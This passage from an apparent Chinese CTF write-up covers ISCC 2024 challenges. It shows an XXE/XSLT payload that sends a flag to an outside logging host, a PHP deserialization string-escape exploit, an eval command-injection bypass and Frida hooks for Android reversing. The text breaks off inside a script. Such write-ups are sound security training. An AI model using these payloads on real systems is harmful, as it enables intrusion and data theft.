&lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="line">            https://hc.lc/log2.php?&amp;xxe;</span><br><span class="line">          &lt;/xsl:attribute&gt;</span><br><span class="line">        &lt;/img&gt;</span><br><span class="line">      &lt;/BODY&gt;</span><br><span class="line">    &lt;/HTML&gt;</span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;`</span><br><span class="line"></span><br><span class="line">xml=`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,$&#123;btoa(xmls)&#125;&quot;?&gt;</span><br><span class="line">&lt;asdf&gt;&lt;/asdf&gt;`</span><br><span class="line">xss=encodeURIComponent(xml)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://impossible-xss.mc.ax/?xss=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2BCjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHBzOi8vaW1wb3NzaWJsZS14c3MubWMuYXgvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdGNoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTEU%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHBzOi8vaGMubGMvbG9nMi5waHA%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%22%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E</span><br></pre></td></tr></table></figure><h3 id="擂台题-2"><a href="#擂台题-2" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="《狂飙》知多少"><a href="#《狂飙》知多少" class="headerlink" title="《狂飙》知多少"></a>《狂飙》知多少</h4><p>给了一个网页</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf4e4e0.png" alt="image-20240506201453561"></p><p>这句话对应台词是：你就是个臭卖鱼的,我想吃鱼了,你就遭老罪喽</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf83439.png" alt="image-20240506201913104"></p><p>也是：你就是个臭卖鱼的,我想吃鱼了,你就遭老罪喽</p><p>然后拿到源码：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcceaa321.png" alt="image-20240506201957998"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./2024ISCC.php&quot;</span>);</span><br><span class="line"><span class="comment">// 欢迎大家来到ISCC，本题大家将扮演《狂飙》中的警察，寻找关键证据，抓捕犯罪嫌疑人。</span></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">police</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$work</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$awarding</span> = <span class="string">&quot;salary&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;work = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是一名人民警察，打击违法犯罪义不容辞&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; work = <span class="keyword">new</span> <span class="title function_ invoke__">suspect</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt; work -&gt; evidence_video;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt; work -&gt; evidence_fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suspect</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$video</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fingerprint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&quot;evidence_video&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;property.transactions怎么可能这么容易获得呢?&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;blood.fingerprint怎么可能这么容易获得呢?&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; video = <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; fingerprint = <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;差点就让你获得证据了&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$camera</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$technology</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;使用camera和technology可以找到蛛丝马迹&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; camera = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; technology  = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;light&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;evidence&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">police</span>(<span class="variable">$_GET</span>[<span class="string">&quot;evidence&quot;</span>])));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tips</span>;</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>, <span class="variable">$tips</span>) !== <span class="literal">false</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>) -&gt; awarding == <span class="string">&quot;pennant&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>反序列化+字符串逃逸</p><p>字符串逃逸的话是构造：awarding&#x3D;pennat</p><p>也就是每次多1个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;evil&quot;</span>*<span class="built_in">len</span>(<span class="string">&#x27;&quot;;s:8:&quot;awarding&quot;;s:7:&quot;pennant&quot;;&#125;&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce1f838.png" alt="image-20240506202649292"></p><p>得到：</p><p>evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil</p><p>结合一下也就是：</p><p>evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil”;s:8:”awarding”;s:7:”pennant”;}</p><p>然后就是反序列化的触发：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">suspect</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$video</span>= <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fingerprint</span>= <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;video = <span class="string">&quot;property.transactions&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fingerprint = <span class="string">&quot;blood.fingerprint&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;差点就让你获得证据了&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tools</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$camera</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$technology</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">tools</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span>=<span class="keyword">new</span> <span class="title function_ invoke__">suspect</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce6fb55.png" alt="image-20240506203452933"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;tools&quot;:3:&#123;s:6:&quot;object&quot;;O:7:&quot;suspect&quot;:2:&#123;s:14:&quot; suspect video&quot;;s:21:&quot;property.transactions&quot;;s:20:&quot; suspect fingerprint&quot;;s:17:&quot;blood.fingerprint&quot;;&#125;s:13:&quot; tools camera&quot;;i:1;s:17:&quot; tools technology&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce24850.png" alt="image-20240506203641586"></p><p>将我们字符串逃逸的结果接到这个后面就行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?evidence=?evidence=O:5:&quot;tools&quot;:3:&#123;s:6:&quot;object&quot;;O:7:&quot;suspect&quot;:2:&#123;s:14:&quot;suspectvideo&quot;;s:21:&quot;property.transactions&quot;;s:20:&quot;suspectfingerprint&quot;;s:17:&quot;blood.fingerprint&quot;;&#125;s:13:&quot;toolscamera&quot;;i:1;s:17:&quot;toolstechnology&quot;;i:1;&#125;evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil&quot;;s:8:&quot;awarding&quot;;s:7:&quot;pennant&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce78464.png" alt="image-20240506204153616"></p><p>ISCC{vI3OzkwefMyu@vBK}</p><h4 id="最喜欢的一集"><a href="#最喜欢的一集" class="headerlink" title="最喜欢的一集"></a>最喜欢的一集</h4><p>进来</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd40747.png" alt="image-20240525130727071"></p><p>hint是welcome.php 访问一下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce43117.png" alt="image-20240525130936293"></p><p>黑名单过滤 简单绕过一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCC=eval(&quot;sys$&#123;0&#125;tem(&#x27;ls /&#x27;);&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce51e83.png" alt="image-20240525131056762"></p><p>出了目录</p><p>但是禁了一些读文件的命令 但是明显没禁完</p><p>这里我们用head命令读flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCC=eval(&quot;sys$&#123;0&#125;tem(&#x27;head /flaaaaaaaaagggggg&#x27;);&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fccdf0670.png" alt="image-20240525131449109"></p><h2 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h2><h3 id="练武题-3"><a href="#练武题-3" class="headerlink" title="练武题"></a>练武题</h3><h4 id="Puzzle-Game"><a href="#Puzzle-Game" class="headerlink" title="Puzzle_Game"></a>Puzzle_Game</h4><p>附件给了一个apk文件</p><p>将apk文件拖入jadx</p><p>在源代码&#x2F;com&#x2F;example.whathappened&#x2F;Receiver中找到关键信息–随机数种子<code>3468L</code></p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfba3a0b.png" alt="image-20240506195506007"></p><p>编写java代码，生成对应的随机字节数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] array=generateSalt(<span class="number">16</span>);</span><br><span class="line">        System.out.println(Arrays.toString(array));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] generateSalt(<span class="type">int</span> i) &#123;</span><br><span class="line">        <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Random</span>(<span class="number">3468L</span>).nextBytes(array);</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcfbcd1dc.png" alt="image-20240506200156653"></p><p>[56, 88, 36, -37, -15, -20, 48, 67, 51, -86, 122, -114, -76, 78, 63, 71]</p><p>ok 然后写python脚本生成对应flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="keyword">lambda</span> x: [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line">b = <span class="keyword">lambda</span> x: base64.b64encode(<span class="built_in">bytes</span>(x)).decode()</span><br><span class="line">c = <span class="keyword">lambda</span> x: [c_uint8(i).value <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line">enc0 = a(<span class="string">&quot;04999999gwC9nOCNUhsHqZm&quot;</span>)</span><br><span class="line">p = c([<span class="number">56</span>, <span class="number">88</span>, <span class="number">36</span>, -<span class="number">37</span>, -<span class="number">15</span>, -<span class="number">20</span>, <span class="number">48</span>, <span class="number">67</span>, <span class="number">51</span>, -<span class="number">86</span>, <span class="number">122</span>, -<span class="number">114</span>, -<span class="number">76</span>, <span class="number">78</span>, <span class="number">63</span>, <span class="number">71</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc0)):</span><br><span class="line">    enc0[i] ^= p[i % <span class="built_in">len</span>(p)]</span><br><span class="line">mn = a(b(p + enc0))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mn)):</span><br><span class="line">    mn[i] += <span class="number">0x7f</span></span><br><span class="line">    mn[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mn)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        mn[i] ^= <span class="number">0x7b</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mn[i] ^= <span class="number">0xea</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>+b(mn)[:<span class="number">32</span>]+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcfc29a29.png" alt="image-20240506200646499"></p><p>ISCC{tS+dAMpEvBi3LrcTiweLJIguyESqHJwY}</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfb4d6de.png" alt="image-20240506200749969"></p><h4 id="ChallengeMobile"><a href="#ChallengeMobile" class="headerlink" title="ChallengeMobile"></a>ChallengeMobile</h4><p>jadx反编译</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfbaa55f.png" alt="image-20240525014205696"></p><p>发现是在动态加载dex </p><p>frida然后hook的native混淆方法的返回值 dump下来dex</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfc3d567.png" alt="image-20240525014221076"></p><p>写个脚本可以跑：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.example.challengemobile.MainActivity&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.a.implementation = function (bArr) &#123;</span></span><br><span class="line"><span class="string">        var result = this.a(bArr);</span></span><br><span class="line"><span class="string">        console.log(&quot;res: &quot;, result);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span> (message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;challengemobile&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>dex发现<code>(52 / (length + 1)) + 6; 1640531527</code></p><p>是xxtea加密</p><p>key在native中</p><p>跑下脚本 调试getKey得密钥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main() &#123;</span></span><br><span class="line"><span class="string">    Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">        var ClassUse = Java.use(&quot;java.lang.Class&quot;);</span></span><br><span class="line"><span class="string">        var dexclassLoader = Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span></span><br><span class="line"><span class="string">        dexclassLoader.loadClass.overload(&quot;java.lang.String&quot;, &quot;boolean&quot;).implementation =</span></span><br><span class="line"><span class="string">            function (name, initialize) &#123;</span></span><br><span class="line"><span class="string">                console.log(&quot;Loading class:&quot;, name);  // Debug: 输出尝试加载的类名</span></span><br><span class="line"><span class="string">                var result = this.loadClass(name, initialize);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (name === &quot;com.example.challengemobile.Checker&quot;) &#123;</span></span><br><span class="line"><span class="string">                    console.log(&quot;Found target class:&quot;, name);  // Debug: 确认找到目标类</span></span><br><span class="line"><span class="string">                    var hookClass = result;</span></span><br><span class="line"><span class="string">                    var hookClassCast = Java.cast(hookClass, ClassUse);</span></span><br><span class="line"><span class="string">                    try &#123;</span></span><br><span class="line"><span class="string">                        var method = hookClassCast.getMethod(&quot;getKey&quot;, []);</span></span><br><span class="line"><span class="string">                        var keyResult = method.invoke(null, []);</span></span><br><span class="line"><span class="string">                        console.log(&quot;Key obtained:&quot;, keyResult);  // 输出getKey的结果</span></span><br><span class="line"><span class="string">                        return keyResult;</span></span><br><span class="line"><span class="string">                    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">                        console.log(&quot;Error during method invocation:&quot;, e);  // 如果getMethod或invoke出错，输出错误信息</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                return result;</span></span><br><span class="line"><span class="string">            &#125;;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span> (message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;challengemobile&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>最后XXTea解密得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xxtea</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入数据</span></span><br><span class="line">key1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">encrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypted_data = xxtea.decrypt(encrypted_data, key,padding=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure><h4 id="ohHELP"><a href="#ohHELP" class="headerlink" title="ohHELP"></a>ohHELP</h4><p>jadx打开看下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfc23b59.png" alt="image-20240525124424353"></p><p>研究下 发现a.a()会产生空异常，跟一下，发现GetKey返回为null</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfbeda6b.png" alt="image-20240525124537097"></p><p>同时可以在ssh下找到个key</p><p>frida对其进行设置返回值后可以看到其在调用property的时候退出，这时需要我们再次手动设置一下对应的返回值信息：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcfc1e799.png" alt="image-20240525124640143"></p><p>然后我们的Hook AesUtil.encrypt就不会有错误而退出</p><p>但是GetTime返回的又是现在的一个时间戳，需要再次设置一下目标时间</p><p>然后再次hook便可以得到flag</p><p>frida写脚本：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.ohhelp.MyJNI.Myjni&quot;</span>);</span><br><span class="line"><span class="title class_">Myjni</span>[<span class="string">&quot;GetKey&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetKey is called&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title class_">GetKey</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetKey ret value is &#x27;</span> + ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;PUDzbflthjqxlJVW&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">System</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.System&#x27;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">getProperty</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">propertyName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">getProperty</span>(propertyName);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;System.getProperty called with propertyName: &quot;</span> + propertyName + <span class="string">&quot;, returned: &quot;</span> + returnValue);</span><br><span class="line">    <span class="keyword">if</span> (propertyName === <span class="string">&quot;java.vm.vendor&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnValue;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Myjni</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.ohhelp.MyJNI.Myjni&quot;</span>);</span><br><span class="line"><span class="title class_">Myjni</span>[<span class="string">&quot;GetTime&quot;</span>].<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;GetTime is called&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> ret = <span 